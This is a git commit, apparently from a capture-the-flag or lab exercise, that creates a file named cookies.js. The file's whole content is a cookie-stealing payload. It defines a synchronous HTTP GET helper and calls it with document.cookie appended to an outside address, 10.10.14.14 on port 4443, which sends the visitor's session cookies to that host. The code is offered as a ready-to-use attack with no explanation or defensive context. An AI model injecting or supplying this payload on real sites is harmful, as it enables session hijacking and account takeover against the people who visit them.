8faa42ceff49863916aa3555a9bb67bc1b2be65f
Shikamaru <83874115+Lyzard-NS@users.noreply.github.com>
2022-02-12 03:11:11 +0100

    Create cookies.js

---
+++ cookies.js
@@ -0,0 +1,8 @@
+function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+httpGet("https://10.10.14.14:4443/"+document.cookie);
